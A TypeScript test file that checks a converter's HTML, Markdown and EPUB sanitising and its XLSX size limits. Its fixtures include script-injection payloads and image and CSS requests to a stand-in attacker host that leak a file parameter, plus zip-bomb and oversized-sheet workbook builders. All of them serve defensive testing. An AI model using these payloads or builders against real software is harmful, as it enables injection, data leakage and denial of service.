import { describe, expect, it } from 'vitest';
import JSZip from 'jszip';
import { safeHtmlDocument, safeHtmlBody } from '@/lib/safe-html';
import { mdToHtml } from '@/lib/markdown-converters';
import { htmlToEpub } from '@/lib/epub-converter';
import { readWorkbook } from '@/lib/xlsx';

async function maliciousWorkbook(sheetData: string): Promise<Uint8Array> {
  const zip = new JSZip();
  zip.file(
    'xl/workbook.xml',
    '<workbook xmlns:r="r"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets></workbook>',
  );
  zip.file(
    'xl/_rels/workbook.xml.rels',
    '<Relationships><Relationship Id="rId1" Type="x/worksheet" Target="worksheets/sheet1.xml"/></Relationships>',
  );
  zip.file(
    'xl/worksheets/sheet1.xml',
    `<worksheet><sheetData>${sheetData}</sheetData></worksheet>`,
  );
  return zip.generateAsync({ type: 'uint8array', compression: 'DEFLATE' });
}

describe('security: exported HTML', () => {
  it('removes scripts, event handlers, javascript URLs and external image requests', () => {
    const result = safeHtmlBody(
      '<h1>Safe</h1><script>alert(1)</script>' +
        '<img src="https://attacker.invalid/track?file=secret" onerror="alert(1)">' +
        '<a href="javascript:alert(1)" onclick="alert(1)">click</a>' +
        '<p style="background:url(https://attacker.invalid/px)">hello</p>',
    );
    expect(result).toContain('<h1>Safe</h1>');
    expect(result).toContain('hello');
    expect(result).not.toMatch(/<script|onerror|onclick|javascript:|attacker\.invalid|style=/i);
  });

  it('keeps only local embedded raster images and adds a restrictive CSP', () => {
    const good = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="icon">';
    const evil = '<img src="data:image/svg+xml;base64,PHN2Zy8+" alt="evil">';
    const html = safeHtmlDocument('x < y', good + evil);
    expect(html).toContain('data:image/png;base64,iVBORw0KGgo=');
    expect(html).not.toContain('data:image/svg+xml');
    expect(html).toContain("default-src 'none'");
    expect(html).toContain('<title>x &lt; y</title>');
  });

  it('sanitizes downloaded Markdown HTML rather than just the UI preview', async () => {
    const input = new File(
      ['# Title\n\n<script>alert(1)</script>\n\n[bad](javascript:alert(1))'],
      'test.md',
    );
    const html = await (await mdToHtml(input, 'md', 'html')).text();
    expect(html).toContain('<h1>Title</h1>');
    expect(html).not.toMatch(/<script|javascript:/);
    expect(html).toContain('Content-Security-Policy');
  });
});

describe('security: untrusted file resource limits', () => {
  it('rejects a tiny sparse XLSX that would allocate billions of array slots', async () => {
    const data = await maliciousWorkbook(
      '<row r="1"><c r="A1"><v>1</v></c></row>' +
        '<row r="1048576"><c r="XFD1048576"><v>2</v></c></row>',
    );
    expect(data.byteLength).toBeLessThan(2_000);
    await expect(readWorkbook(data)).rejects.toThrow(/too large/i);
  });

  it('rejects compressed XML expansion before parsing the full zip bomb', async () => {
    const data = await maliciousWorkbook('<!--' + 'A'.repeat(9 * 1024 * 1024) + '-->');
    expect(data.byteLength).toBeLessThan(30_000);
    await expect(readWorkbook(data)).rejects.toThrow(/decompressed-size limit/i);
  });

  it('rejects pathological row extents without allocating huge arrays', async () => {
    const data = await maliciousWorkbook('<row r="1048576"><c r="A1048576"><v>1</v></c></row>');
    await expect(readWorkbook(data)).rejects.toThrow(/too large/i);
  });
});

describe('security: EPUB output', () => {
  it('drops inline CSS with remote url() while preserving readable content', async () => {
    const file = new File(
      [
        '<html><body><p style="background:url(https://attacker.invalid/tracker)">Safe content</p></body></html>',
      ],
      'input.html',
    );
    const epub = await htmlToEpub(file, 'html', 'epub');
    const zip = await JSZip.loadAsync(await epub.arrayBuffer());
    const chapter = await zip.file('OEBPS/chapter-1.xhtml')!.async('string');
    expect(chapter).toContain('Safe content');
    expect(chapter).not.toContain('attacker.invalid');
    expect(chapter).not.toContain('style=');
  });
});
